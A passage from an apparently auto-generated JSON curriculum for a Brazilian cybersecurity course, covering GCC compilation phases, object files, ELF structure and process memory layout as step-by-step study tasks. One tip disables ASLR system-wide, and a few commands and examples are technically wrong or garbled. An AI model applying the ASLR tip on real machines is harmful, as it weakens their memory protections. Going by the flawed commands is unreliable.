{
  "formatVersion": "1.0",
  "exportDate": "2025-12-04T21:17:58.775Z",
  "appVersion": "1.0",
  "curriculumData": {
    "metadata": {
      "baseOn": "Catálogo dos Cursos de Graduação 2025 - SC-07",
      "lastUpdated": "2025-12-04",
      "totalAtomicSkills": 328
    },
    "areas": [
      {
        "id": "10",
        "name": "Cibersegurança",
        "description": "Área dedicada aos fundamentos avançados de segurança cibernética, abrangendo exploits, criptografia, redes, web, sistemas operacionais e computação móvel.",
        "disciplines": [
          {
            "id": "10.1",
            "name": "SC-07 - Fundamentos de Segurança Cibernética",
            "description": "Compilação e Semântica de Execução, Análise de Binários, Ataques do Controle de Fluxo de Programas, Execução de Código Vulnerável, Aleatoriedade de endereçamento de memória, Proteção de Memória com Canários, Programação Orientada a Retornos, Integridade do Controle de Fluxo. Criptografia: Funções de números pseudoaleatórios, Cifradores Simétricos, Funções Hash, Criptografia de Chave Pública. Segurança de Redes: Segurança BGP e DNS, Teoria de Detecção de Ataques de Rede, Sistemas de Prevenção de Intrusão. Segurança Web: Ataques de Injeção, XSS e CSRF. Ataques de Negação de Serviço Distribuído. Segurança em Sistemas Operacionais: Autenticação e Autorização. Segurança em Ambiente de Computação Móvel. Bibliografia: DU, W. et al.; PFLEEGER, C. P. et al.; STALLINGS, W. et al.",
            "mainTopics": [
              {
                "id": "10.1.1",
                "name": "Vulnerabilidades de Execução e Proteções de Memória",
                "description": "Cobre compilação e semântica de execução, análise de binários, ataques ao controle de fluxo, execução de código vulnerável, aleatoriedade de endereçamento (ASLR), proteção com canários, programação orientada a retornos (ROP) e integridade do controle de fluxo.",
                "totalSkills": 54,
                "atomicTopics": [
                  {
                    "id": "10.1.1.1",
                    "name": "Compilação e Semântica de Execução",
                    "description": "Processo de transformação de código-fonte em binários executáveis e regras de execução em memória.",
                    "individualConcepts": [
                      {
                        "id": "10.1.1.1.1",
                        "name": "Processo de Compilação",
                        "description": "Etapas detalhadas de transformação de código-fonte em linguagem de alto nível (como C ou C++) em binários executáveis, incluindo pré-processamento, compilação, montagem e ligação, destacando como isso impacta vulnerabilidades de execução.",
                        "specificSkills": [
                          {
                            "id": "10.1.1.1.1.1",
                            "name": "Identificar fases da compilação",
                            "description": "Descrever as quatro fases principais: pré-processador (expansão de macros e inclusão de headers), compilador (geração de código assembly), assembler (código objeto) e linker (binário executável final), com exemplos em GCC.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Estudar a Fase do Pré-processador",
                                  "subSteps": [
                                    "Criar um arquivo de exemplo 'hello.c' com #include <stdio.h>, #define MSG \"Olá Mundo\" e uma função main usando MSG.",
                                    "Executar o comando 'gcc -E hello.c -o preprocessed.i' para gerar o arquivo pré-processado.",
                                    "Analisar o conteúdo de 'preprocessed.i', identificando a expansão de macros, inclusão de headers e remoção de comentários.",
                                    "Comparar o código original com o pré-processado, destacando as mudanças.",
                                    "Pesquisar na documentação do GCC (man gcc) sobre diretivas como #ifdef e #pragma."
                                  ],
                                  "verification": "O arquivo 'preprocessed.i' contém o código expandido sem diretivas de pré-processador e com headers incluídos inline.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "GCC instalado",
                                    "Editor de texto (ex: VS Code)",
                                    "Terminal/Linux ou WSL"
                                  ],
                                  "tips": "Use a flag -E para isolar o pré-processador; redirecione output com > para análise fácil.",
                                  "learningObjective": "Compreender como o pré-processador expande macros e inclui headers antes da compilação propriamente dita.",
                                  "commonMistakes": [
                                    "Confundir pré-processamento com compilação de código; ignorar que comentários são removidos aqui"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar a Fase do Compilador",
                                  "subSteps": [
                                    "Usar o arquivo pré-processado ou original e executar 'gcc -S hello.c -o hello.s' para gerar código assembly.",
                                    "Abrir e analisar 'hello.s', identificando instruções assembly geradas a partir do C.",
                                    "Mapear trechos do código C original para equivalentes em assembly (ex: printf vira chamadas de função).",
                                    "Comparar com documentação de arquitetura x86/ARM para entender tradução high-level para low-level.",
                                    "Testar variações no código C e observar mudanças no assembly gerado."
                                  ],
                                  "verification": "O arquivo 'hello.s' contém código assembly legível com labels, instruções MOV, CALL etc., sem símbolos de linker.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "GCC instalado",
                                    "Editor de texto com syntax highlight para assembly",
                                    "Terminal"
                                  ],
                                  "tips": "Flag -S gera assembly; use -O0 para código sem otimizações e mais legível.",
                                  "learningObjective": "Descrever como o compilador traduz código C em assembly, gerando código intermediário de baixo nível.",
                                  "commonMistakes": [
                                    "Achar que assembly é executável; não perceber otimizações que alteram o output"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar a Fase do Assembler",
                                  "subSteps": [
                                    "Executar 'gcc -c hello.s -o hello.o' ou 'gcc -c hello.c -o hello.o' para gerar objeto.",
                                    "Usar 'objdump -d hello.o' ou 'readelf -a hello.o' para inspecionar o arquivo objeto.",
                                    "Identificar seções (.text, .data), símbolos e código machine code.",
                                    "Comparar o objeto com o assembly fonte, notando tradução para binário.",
                                    "Experimentar com múltiplos arquivos .c e ver como assembler processa cada um."
                                  ],
                                  "verification": "'objdump -d hello.o' mostra código disassemblado em machine code, com relocações para linker.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "GCC e binutils (objdump, readelf)",
                                    "Terminal"
                                  ],
                                  "tips": "Flag -c para compilação sem link; objdump é essencial para visualizar objetos.",
                                  "learningObjective": "Entender como o assembler converte assembly em código objeto relocável com seções e símbolos.",
                                  "commonMistakes": [
                                    "Confundir objeto com executável; ignorar tabelas de símbolos e relocações"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Compreender a Fase do Linker",
                                  "subSteps": [
                                    "Executar 'gcc hello.o -o hello' para linkar e gerar executável.",
                                    "Usar 'objdump -d hello' e 'readelf -h hello' para comparar com o objeto.",
                                    "Analisar resolução de símbolos externos (ex: printf de libc), endereços absolutos e seções unificadas.",
                                    "Testar link estático vs dinâmico com 'gcc -static hello.c -o hello_static'.",
                                    "Simular erro de link removendo uma biblioteca e corrigindo."
                                  ],
                                  "verification": "O executável 'hello' roda com './hello' e 'ldd hello' mostra bibliotecas linkadas dinamicamente.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "GCC e ldd",
                                    "Terminal"
                                  ],
                                  "tips": "Flag padrão linka; use -v para verbose e ver invocações de ld.",
                                  "learningObjective": "Explicar como o linker resolve referências, gera endereços finais e produz o binário executável.",
                                  "commonMistakes": [
                                    "Pensar que linker só concatena objetos; subestimar resolução de símbolos externos"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Integrar e Verificar o Processo Completo",
                                  "subSteps": [
                                    "Executar compilação full 'gcc -Wall -v hello.c -o hello' e analisar output verbose.",
                                    "Usar flags sequenciais: -E, -S, -c e full para traçar o fluxo.",
                                    "Criar fluxograma manual das 4 fases com inputs/outputs.",
                                    "Discutir em fórum ou autoexplicar as fases para um 'parceiro'.",
                                    "Identificar um erro comum em cada fase através de exemplos."
                                  ],
                                  "verification": "Fluxograma correto e explicação oral/lista descrevendo sequência e artefatos de cada fase.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Papel/caneta ou ferramenta de diagrama (ex: draw.io)",
                                    "Todos arquivos gerados anteriormente"
                                  ],
                                  "tips": "-v mostra chamadas internas do GCC; essencial para ver o pipeline completo.",
                                  "learningObjective": "Sintetizar as quatro fases em um processo coeso com exemplos práticos em GCC.",
                                  "commonMistakes": [
                                    "Omitir dependências entre fases; confundir fases adjacentes como uma só"
                                  ]
                                }
                              ],
                              "practicalExample": "Crie 'hello.c': #define MSG \"Olá\\\"\\n\" #include <stdio.h> int main(){printf(MSG);return 0;}. Rode: gcc -E hello.c > pp.i (veja expansão); gcc -S hello.c -o hello.s (assembly); gcc -c hello.s -o hello.o (objeto, objdump -d); gcc hello.o -o hello -no-pie (executável, ./hello roda).",
                              "finalVerifications": [
                                "Listar corretamente as 4 fases na ordem: pré-processador, compilador, assembler, linker.",
                                "Descrever input/output de cada fase com exemplos de arquivos (.i, .s, .o, exe).",
                                "Executar e interpretar flags GCC: -E, -S, -c, -v.",
                                "Explicar papel do pré-processador em macros e headers.",
                                "Identificar artefatos de cada fase usando objdump/readelf.",
                                "Simular compilação completa verbose e apontar transições entre fases.",
                                "Diferenciar link estático vs dinâmico."
                              ],
                              "assessmentCriteria": [
                                "Precisão na sequência e nomes das fases (100% correto).",
                                "Descrições detalhadas com exemplos GCC em pelo menos 80% das fases.",
                                "Análise correta de outputs de ferramentas (objdump, readelf) sem erros.",
                                "Integração do processo completo em fluxograma ou narrativa coerente.",
                                "Uso correto de flags e comandos em demo prática.",
                                "Identificação de 2+ erros comuns por fase.",
                                "Compreensão de relocações e símbolos no contexto de segurança."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C: Entender tradução de código fonte para machine.",
                                "Arquitetura de Computadores: Assembly e instruções de CPU.",
                                "Sistemas Operacionais: Carregamento de executáveis e bibliotecas dinâmicas.",
                                "Cibersegurança: Vulnerabilidades em macros (#include malicioso), symbols expostos (GOT/PLT).",
                                "Engenharia de Software: Build systems (Makefiles) e pipelines CI/CD."
                              ],
                              "realWorldApplication": "Em cibersegurança, compreender as fases permite auditar binários para backdoors em headers pré-processados, symbols não linkados corretamente ou otimizações que mascaram exploits; essencial para reverse engineering de malwares compilados com GCC e análise de vulnerabilidades como buffer overflows na semântica de execução."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.1.1.2",
                            "name": "Analisar geração de código objeto",
                            "description": "Examinar a saída de cada fase, como arquivos .i, .s e .o, e entender símbolos globais/locais e relocações que afetam a semântica de execução em memória.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar ambiente e gerar arquivos intermediários de compilação",
                                  "subSteps": [
                                    "Instale um compilador GCC em Linux (ex: ubuntu: sudo apt install gcc)",
                                    "Crie um programa C simples com variáveis globais e locais (ex: int globalVar = 10; void func() { int localVar = 20; })",
                                    "Compile com flags para intermediários: gcc -E source.c -o source.i; gcc -S source.i -o source.s; gcc -c source.s -o source.o",
                                    "Use objdump para inspecionar: objdump -d source.o",
                                    "Liste símbolos com nm: nm source.o"
                                  ],
                                  "verification": "Verifique se os arquivos .i, .s e .o foram gerados e abrem sem erros no editor de texto ou ferramentas como objdump/nm.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "GCC compiler, editor de texto (vim/nano), terminal Linux, programa C de exemplo",
                                  "tips": "Use -Wall e -g flags para mais detalhes de debug.",
                                  "learningObjective": "Configurar pipeline de compilação para isolar fases e gerar artefatos analisáveis.",
                                  "commonMistakes": "Esquecer flags específicas (-E, -S, -c) ou usar Windows sem WSL, causando incompatibilidades."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar arquivo pré-processado (.i)",
                                  "subSteps": [
                                    "Abra source.i e identifique macros expandidas e includes resolvidos",
                                    "Procure por definições de variáveis globais/locais pré-processadas",
                                    "Compare com source.c original para notar remoção de comentários e expansão de #define",
                                    "Busque por guards de inclusão (#ifndef) e sua resolução",
                                    "Anote linhas que mudaram devido ao pré-processador"
                                  ],
                                  "verification": "Crie um resumo escrito comparando source.c e source.i, destacando 3 diferenças chave.",
                                  "estimatedTime": "20 minutos",
                                  "materials": "Arquivo source.i, diff tool (diff source.c source.i)",
                                  "tips": "Use grep para buscar padrões como '#define' ou variáveis específicas.",
                                  "learningObjective": "Compreender como o pré-processador afeta o código fonte antes da compilação.",
                                  "commonMistakes": "Ignorar expansões condicionais (#ifdef), levando a mal-entendidos sobre código efetivo."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Examinar código assembly gerado (.s)",
                                  "subSteps": [
                                    "Abra source.s e identifique instruções assembly para variáveis globais (ex: .globl globalVar)",
                                    "Localize alocações de stack para locais (ex: sub $16, %rsp para localVar)",
                                    "Identifique chamadas de funções e jumps condicionais",
                                    "Correlacione linhas assembly com funções C originais",
                                    "Anote registradores usados para passagem de parâmetros"
                                  ],
                                  "verification": "Mapeie 2 variáveis (global e local) para suas representações em assembly.",
                                  "estimatedTime": "25 minutos",
                                  "materials": "Arquivo source.s, visualizador de assembly (ex: ghidra ou online disassembler)",
                                  "tips": "Compile com -O0 para assembly mais legível, sem otimizações.",
                                  "learningObjective": "Mapear estruturas C de alto nível para instruções assembly de baixo nível.",
                                  "commonMistakes": "Confundir registradores temporários com alocações permanentes de variáveis."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar código objeto (.o): símbolos e relocações",
                                  "subSteps": [
                                    "Execute nm source.o para listar símbolos (T=texto, D=dados, U=indefinido)",
                                    "Use objdump -t source.o para tabela de símbolos globais/locais",
                                    "Execute objdump -r source.o para entradas de relocação (ex: R_X86_64_PC32)",
                                    "Identifique símbolos globais exportados e locais ocultos",
                                    "Simule linking manual com ld para ver resolução de relocações"
                                  ],
                                  "verification": "Gere relatório listando 3 símbolos globais, 2 locais e 1 relocação com explicação.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Ferramentas nm, objdump, ld; arquivo source.o",
                                  "tips": "Use -f para formato legível em nm: nm -f source.o.",
                                  "learningObjective": "Interpretar tabelas de símbolos e relocações no binário objeto.",
                                  "commonMistakes": "Confundir símbolos undefined (U) com erros, quando são normais para linking."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Relacionar análise com semântica de execução em memória",
                                  "subSteps": [
                                    "Use gdb para carregar source.o e examinar seções com info sections",
                                    "Simule execução: gdb source.o, break na main, run, examine memória (x/10x &globalVar)",
                                    "Observe como relocações afetam endereços em runtime (ex: lazy binding)",
                                    "Identifique impactos de ASLR em endereços globais",
                                    "Teste modificação de um símbolo e recompile para ver mudança em memória"
                                  ],
                                  "verification": "Capture screenshot de gdb mostrando endereço de globalVar e explique relocação.",
                                  "estimatedTime": "35 minutos",
                                  "materials": "GDB debugger, ASLR ativado (sysctl kernel.randomize_va_space=2)",
                                  "tips": "Compile com -no-pie para endereços fixos iniciais.",
                                  "learningObjective": "Conectar artefatos de compilação à layout de memória durante execução.",
                                  "commonMistakes": "Ignorar proteções como NX/DEP, assumindo execução direta de dados."
                                }
                              ],
                              "practicalExample": "Compile 'hello.c' com int global_cnt = 0; void incr() { global_cnt++; int local = 1; } main() { incr(); printf(\"%d\", global_cnt); }'. Gere .i/.s/.o, analise nm/objdump para global_cnt (D global), local implícito em stack, relocações para printf, e use gdb para ver global_cnt em 0x601054 pós-link.",
                              "finalVerifications": [
                                "Identifica corretamente símbolos globais vs locais em nm source.o",
                                "Explica pelo menos 2 tipos de relocações em objdump -r",
                                "Mapeia uma variável C para assembly e memória em gdb",
                                "Compara .i, .s, .o com código original sem erros",
                                "Simula impacto de relocação não resolvida em linking falho",
                                "Descreve como ASLR afeta endereços globais em execução"
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de símbolos (90% correto)",
                                "Explicação clara de relocações e seu papel na memória (detalhada)",
                                "Uso correto de ferramentas (nm, objdump, gdb sem erros)",
                                "Correlação completa entre fases de compilação e execução",
                                "Relatório escrito com exemplos visuais (screenshots/diagramas)",
                                "Profundidade na análise de semântica (endereços, stack, heap)"
                              ],
                              "crossCurricularConnections": [
                                "Programação em C: Mapeamento de alto nível para assembly",
                                "Sistemas Operacionais: Gerenciamento de memória e ASLR",
                                "Engenharia Reversa: Análise de binários para malware",
                                "Arquitetura de Computadores: Instruções x86 e calling conventions"
                              ],
                              "realWorldApplication": "Em cibersegurança, analisa binários de malware para identificar ROP gadgets em .o, detecta símbolos exportados em DLLs hijack, ou debugs exploits de buffer overflow rastreando relocações para overflows precisos em CTFs."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.1.1.3",
                            "name": "Compreender formatos de binários executáveis",
                            "description": "Estudar estruturas como ELF (Executable and Linkable Format) em Linux, identificando seções (text, data, stack) e headers que definem o carregamento em memória.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender a estrutura básica do formato ELF",
                                  "subSteps": [
                                    "Pesquisar a definição e história do ELF como formato padrão em Linux/Unix.",
                                    "Identificar os componentes principais: ELF Header, Program Header Table (PHT) e Section Header Table (SHT).",
                                    "Visualizar diagramas da layout de um arquivo ELF usando recursos online.",
                                    "Comparar ELF com outros formatos como PE (Windows).",
                                    "Ler a especificação básica do ELF Header (magic bytes, classe, endianness)."
                                  ],
                                  "verification": "Desenhar e rotular um diagrama da estrutura ELF com pelo menos 4 componentes principais.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação oficial ELF (elf(5) man page)",
                                    "Ferramenta readelf",
                                    "Diagrama ELF no Wikipedia"
                                  ],
                                  "tips": "Sempre verifique o magic number '7F 45 4C 46' no início de um binário ELF com hexdump.",
                                  "learningObjective": "Compreender os componentes fundamentais e a organização de um arquivo ELF.",
                                  "commonMistakes": "Confundir seções (para linking) com segmentos (para loading), que são conceitos distintos."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar os Headers do ELF",
                                  "subSteps": [
                                    "Usar readelf -h para inspecionar o ELF Header de um binário simples.",
                                    "Examinar campos chave: e_type (executável/shared), e_machine (arquitetura), e_entry (ponto de entrada).",
                                    "Listar Program Headers com readelf -l e entender tipos como PT_LOAD, PT_DYNAMIC.",
                                    "Listar Section Headers com readelf -S e identificar nomes como .text, .data.",
                                    "Interpretar offsets e tamanhos para mapear na memória virtual."
                                  ],
                                  "verification": "Executar readelf em um binário e explicar verbalmente 3 campos do ELF Header e 2 Program Headers.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "GCC para compilar um hello world: gcc -o hello hello.c",
                                    "readelf",
                                    "objdump"
                                  ],
                                  "tips": "Compile com -g para debugar e veja seções extras; use objdump -h para headers detalhados.",
                                  "learningObjective": "Identificar e interpretar headers que definem metadados e carregamento.",
                                  "commonMistakes": "Ignorar endianness little/big, que afeta interpretação de multi-bytes."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Identificar seções e segmentos principais",
                                  "subSteps": [
                                    "Mapear seções comuns: .text (código executável), .data (dados inicializados), .bss (dados não inicializados).",
                                    "Usar readelf -S para listar seções e objdump -d para disassemblar .text.",
                                    "Entender segmentos PT_LOAD que agrupam seções para loading em memória.",
                                    "Diferenciar stack (cresce para baixo) e heap (cresce para cima) no contexto de runtime.",
                                    "Analisar permissões: r (read), w (write), x (execute) em headers."
                                  ],
                                  "verification": "Listar 5 seções principais de um binário e descrever suas funções e permissões.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "Binário hello compilado",
                                    "readelf -S, objdump -h -d",
                                    "GDB para inspecionar runtime"
                                  ],
                                  "tips": "Use readelf --segments para ver como seções viram segmentos carregáveis.",
                                  "learningObjective": "Reconhecer seções chave e como elas são mapeadas em segmentos para execução.",
                                  "commonMistakes": "Assumir que stack é uma seção no arquivo (ela é alocada em runtime)."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Compreender o carregamento em memória",
                                  "subSteps": [
                                    "Simular o loader: ELF Header indica PHT, que carrega segmentos em endereços virtuais.",
                                    "Usar gdb para ver layout de memória: info proc mappings.",
                                    "Explicar inicialização: stack com argc/argv/envp, heap via brk/sbrk.",
                                    "Analisar como ASLR randomiza endereços e afeta loading.",
                                    "Testar com um binário e observar mudanças em diferentes execuções."
                                  ],
                                  "verification": "Executar gdb em um binário, mostrar mappings e explicar 3 aspectos do carregamento.",
                                  "estimatedTime": "75 minutos",
                                  "materials": [
                                    "GDB",
                                    "Binário ELF simples",
                                    "Documentação loader.ld.so"
                                  ],
                                  "tips": "Desabilite ASLR com echo 0 > /proc/sys/kernel/randomize_va_space para previsibilidade.",
                                  "learningObjective": "Entender o processo dinâmico de loading e layout de memória em runtime.",
                                  "commonMistakes": "Confundir endereços virtuais no arquivo com reais em memória após loading."
                                }
                              ],
                              "practicalExample": "Compile um programa C simples 'hello world' com gcc -o hello hello.c. Use readelf -a hello para analisar headers e seções. Em gdb, execute 'start' e 'info proc mappings' para ver como .text é carregado em ~0x400000, .data em ~0x600000, stack em ~0x7ffff... e heap crescendo de baixo.",
                              "finalVerifications": [
                                "Explicar a diferença entre Program Headers e Section Headers.",
                                "Listar e descrever 4 seções principais (.text, .data, .bss, .rodata).",
                                "Interpretar output de readelf -h e identificar e_entry.",
                                "Desenhar o layout de memória pós-loading com stack, heap, segmentos.",
                                "Identificar permissões em um PT_LOAD via readelf -l.",
                                "Comparar ELF com formato não-ELF usando file comando."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de componentes ELF (headers, seções, segmentos).",
                                "Capacidade de usar ferramentas (readelf, objdump, gdb) corretamente.",
                                "Compreensão conceitual de loading e permissões de memória.",
                                "Explicação clara de erros comuns como confusão seções/segmentos.",
                                "Aplicação prática em análise de binário real.",
                                "Integração com conceitos de cibersegurança (ex: exploits em .text)."
                              ],
                              "crossCurricularConnections": [
                                "Sistemas Operacionais: Gerenciamento de memória virtual e loaders.",
                                "Programação em C/Assembly: Geração de binários e disassembly.",
                                "Análise Reversa: Ferramentas para engenharia reversa de malware.",
                                "Arquitetura de Computadores: Endereçamento virtual e proteção de páginas."
                              ],
                              "realWorldApplication": "Em cibersegurança, compreender ELF permite análise de malware Linux (ex: identificar payloads em .text), exploração de ROP em binários vulneráveis, bypass de proteções como RELRO/PIE, e desenvolvimento de detecção de binários maliciosos em ferramentas como antivirus ou IDS."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.1.1.2",
                        "name": "Semântica de Execução em Memória",
                        "description": "Regras de execução do binário carregado em memória, incluindo layout de segmentos, gerenciamento de pilha, chamadas de função e controle de fluxo, base para exploits como buffer overflow.",
                        "specificSkills": [
                          {
                            "id": "10.1.1.1.2.1",
                            "name": "Descrever layout de memória de processos",
                            "description": "Explicar segmentos de memória: text (código), data (variáveis globais), BSS (não inicializadas), heap (alocação dinâmica) e stack (locais e chamadas), com diagramas virtuais de endereço.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Conceitos Básicos de Memória Virtual e Layout de Processo",
                                  "subSteps": [
                                    "Estude o conceito de memória virtual e sua divisão em espaços de endereço para processos.",
                                    "Diferencie endereços virtuais de endereços físicos e o papel do MMU (Memory Management Unit).",
                                    "Identifique a estrutura geral do layout de memória de um processo em sistemas Unix-like.",
                                    "Revise como o linker organiza os segmentos durante a compilação.",
                                    "Anote as características principais de um layout típico: de baixo para alto endereço (text, data, BSS, heap, stack)."
                                  ],
                                  "verification": "Crie um esboço manual do layout geral de memória de um processo, rotulando as regiões principais.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Documentação de Sistemas Operacionais (ex: man pages do Linux)",
                                    "Vídeo tutorial sobre memória virtual (YouTube ou Khan Academy)",
                                    "Papel e caneta para esboço"
                                  ],
                                  "tips": "Use a analogia de um prédio com andares numerados (endereços virtuais) para visualizar melhor.",
                                  "learningObjective": "Dominar os fundamentos de memória virtual e a organização espacial de um processo.",
                                  "commonMistakes": [
                                    "Confundir memória virtual com RAM física",
                                    "Ignorar o papel do SO na alocação de endereços",
                                    "Esquecer que o layout cresce para cima no heap e para baixo no stack"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar Segmentos Estáticos: Text, Data e BSS",
                                  "subSteps": [
                                    "Descreva o segmento text: contém código executável, somente leitura, alocado pelo linker.",
                                    "Explique o segmento data: variáveis globais inicializadas, tamanho fixo em tempo de compilação.",
                                    "Detalhe o segmento BSS: variáveis globais não inicializadas (zeradas pelo SO), otimizado para economia de espaço no binário.",
                                    "Compare tamanhos e permissões: text (RX), data (RW), BSS (RW).",
                                    "Examine um binário com 'readelf' ou 'objdump' para ver tamanhos reais desses segmentos."
                                  ],
                                  "verification": "Execute 'size programa.o' em um executável C simples e interprete os tamanhos de text, data e BSS.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Compilador GCC",
                                    "Ferramentas: readelf, objdump, size",
                                    "Exemplo de código C com globais inicializadas e BSS"
                                  ],
                                  "tips": "Compile com '-g' para depuração e use flags como '--verbose' para ver alocações.",
                                  "learningObjective": "Diferenciar e caracterizar os segmentos estáticos com exemplos práticos.",
                                  "commonMistakes": [
                                    "Pensar que BSS é inicializada no código fonte",
                                    "Confundir data com BSS",
                                    "Esquecer permissões de leitura/execução no text"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar Segmentos Dinâmicos: Heap e Stack",
                                  "subSteps": [
                                    "Descreva o heap: cresce para cima, gerenciado por malloc/free, alocações em runtime.",
                                    "Explique o stack: cresce para baixo, usado para variáveis locais, parâmetros de função e frames de pilha.",
                                    "Entenda o papel do programa break (limite heap) e stack pointer (SP).",
                                    "Simule alocações: crie um programa que use malloc e recursão para demonstrar crescimento.",
                                    "Discuta proteções ASLR e canaries em stack para segurança."
                                  ],
                                  "verification": "Use gdb para inspecionar endereços de variáveis locais (stack), malloc (heap) e globais durante execução.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "GDB debugger",
                                    "Código C exemplo com malloc, free e recursão",
                                    "Documentação malloc(3)"
                                  ],
                                  "tips": "Execute 'info proc mappings' no gdb para ver o mapa de memória real do processo.",
                                  "learningObjective": "Compreender alocações dinâmicas e seu impacto no layout de memória.",
                                  "commonMistakes": [
                                    "Confundir direção de crescimento (heap up, stack down)",
                                    "Ignorar overhead de metadados no heap",
                                    "Subestimar colisões em ASLR"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Criar Diagrama Virtual de Endereços e Sintetizar o Layout Completo",
                                  "subSteps": [
                                    "Desenhe um diagrama completo mostrando endereços virtuais típicos (ex: 0x08048000 para text em Linux).",
                                    "Rotule cada segmento com exemplos de conteúdo e setas indicando crescimento.",
                                    "Explique transições: como brk() move o limite do heap e chamadas de função afetam stack.",
                                    "Relacione com cibersegurança: vulnerabilidades como stack overflow explorando layout.",
                                    "Teste conhecimento compilando e analisando um programa multifuncional."
                                  ],
                                  "verification": "Produza um diagrama digital ou impresso com endereços virtuais aproximados e legendas detalhadas.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Ferramenta de desenho (Draw.io, papel)",
                                    "Exemplo binário analisado com gdb/readelf",
                                    "Referência de layout Linux (proc/PID/maps)"
                                  ],
                                  "tips": "Consulte /proc/PID/maps de um processo rodando para valores reais de endereços.",
                                  "learningObjective": "Visualizar e articular o layout completo com ênfase em endereços virtuais.",
                                  "commonMistakes": [
                                    "Endereços fixos sem considerar ASLR",
                                    "Diagrama sem setas de crescimento",
                                    "Omitir bibliotecas compartilhadas no layout"
                                  ]
                                }
                              ],
                              "practicalExample": "Compile um programa C simples com variáveis globais (data/BSS), malloc (heap) e uma função recursiva (stack). Use gdb para breakpoints e 'x/10x $sp' para examinar stack, 'info proc mappings' para layout completo, e desenhe o diagrama baseado nos endereços observados.",
                              "finalVerifications": [
                                "Liste corretamente os 5 segmentos com suas características principais (propósito, permissões, crescimento).",
                                "Desenhe um diagrama preciso de layout com endereços virtuais relativos.",
                                "Explique como inspecionar layout em um processo real com ferramentas como gdb ou /proc/maps.",
                                "Identifique pelo menos 2 vulnerabilidades de segurança ligadas ao layout (ex: stack overflow, heap spray).",
                                "Simule alocação dinâmica e observe mudanças no mapa de memória.",
                                "Diferencie BSS de data com um exemplo de código compilado."
                              ],
                              "assessmentCriteria": [
                                "Precisão e completude das definições de cada segmento (90% cobertura).",
                                "Qualidade e legibilidade do diagrama virtual de endereços.",
                                "Correta interpretação de saídas de ferramentas como readelf, size e gdb.",
                                "Integração de conceitos de segurança cibernética no layout.",
                                "Profundidade dos substeps executados e verificações pessoais.",
                                "Capacidade de relacionar teoria a prática em exemplos reais."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C: Uso de malloc/free e ponteiros.",
                                "Sistemas Operacionais: Gerenciamento de memória e chamadas syscall (brk, mmap).",
                                "Segurança da Informação: Exploits como buffer overflow e ROP (Return Oriented Programming).",
                                "Arquitetura de Computadores: Endereçamento virtual e paginamento.",
                                "Análise de Binários: Ferramentas de reverse engineering (objdump, radare2)."
                              ],
                              "realWorldApplication": "Em cibersegurança, compreender o layout de memória é essencial para análise de exploits como buffer overflows no stack ou use-after-free no heap, permitindo desenvolver mitigações como ASLR, NX bits e stack canaries em aplicações críticas."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.1.2.2",
                            "name": "Analisar chamadas e retornos de funções",
                            "description": "Detalhar o uso da pilha para parâmetros, registradores de retorno (EIP/RIP), frames de pilha e prologue/epílogo de funções, identificando pontos vulneráveis a ataques de controle de fluxo.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Prologue e Epílogo de Funções em Assembly",
                                  "subSteps": [
                                    "Estude o código assembly gerado por um compilador para funções simples em C.",
                                    "Identifique instruções típicas do prologue: push ebp; mov ebp, esp.",
                                    "Analise o epílogo: mov esp, ebp; pop ebp; ret.",
                                    "Explique como esses blocos estabelecem e restauram o stack frame.",
                                    "Compare variações em arquiteturas x86 e x64."
                                  ],
                                  "verification": "Escreva um resumo de 200 palavras descrevendo prologue/epílogo e compile um exemplo C para validar.",
                                  "estimatedTime": "1-2 horas",
                                  "materials": [
